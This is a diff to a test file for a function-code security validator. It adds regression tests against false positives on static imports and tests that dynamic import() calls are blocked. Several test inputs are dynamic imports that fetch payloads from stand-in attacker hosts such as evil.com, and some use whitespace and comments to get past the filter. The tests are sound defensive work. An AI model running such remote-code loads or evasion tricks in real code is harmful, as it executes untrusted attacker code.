@@ -131,9 +131,47 @@ describe('FunctionService Security Validation (Public API)', () => {
       await expect(createTestFunction(code)).resolves.toBeDefined();
     });
 
+    it('should allow the canonical docs example (semicolon-less static import + function)', async () => {
+      // Regression: the old /\bimport\b[^;]*\(/ matched across newlines from a
+      // semicolon-less `import` to the '(' in `function(req)`, falsely rejecting
+      // every function that imported anything. This is the exact docs example.
+      const code = [
+        "import { createClient } from 'npm:@insforge/sdk'",
+        '',
+        'export default async function(req) {',
+        "  return new Response('hello')",
+        '}',
+      ].join('\n');
+      mockClient.query.mockResolvedValueOnce({});
+      mockClient.query.mockResolvedValueOnce({});
+      mockClient.query.mockResolvedValueOnce({ rows: [{ id: '1' }] });
+      await expect(createTestFunction(code)).resolves.toBeDefined();
+    });
+
+    it('should allow a static import followed by String.fromCharCode (no false positive)', async () => {
+      const code = [
+        "import { createClient } from 'npm:@insforge/sdk'",
+        "const tag = String.fromCharCode(72, 105)",
+        'export default async function(req) { return new Response(tag) }',
+      ].join('\n');
+      mockClient.query.mockResolvedValueOnce({});
+      mockClient.query.mockResolvedValueOnce({});
+      mockClient.query.mockResolvedValueOnce({ rows: [{ id: '1' }] });
+      await expect(createTestFunction(code)).resolves.toBeDefined();
+    });
+
     it('should block dynamic import() calls', async () => {
       const code = 'import("http://malicious.com/payload.js")';
       await expect(createTestFunction(code)).rejects.toThrow(GENERIC_ERROR);
+    });
+
+    it('should block dynamic import() with whitespace and block comment', async () => {
+      await expect(createTestFunction('import ("http://evil.com/x.js")')).rejects.toThrow(
+        GENERIC_ERROR
+      );
+      await expect(createTestFunction('import /* sneaky */ ("http://evil.com/x.js")')).rejects.toThrow(
+        GENERIC_ERROR
+      );
     });
 
     it('should block require keyword', async () => {
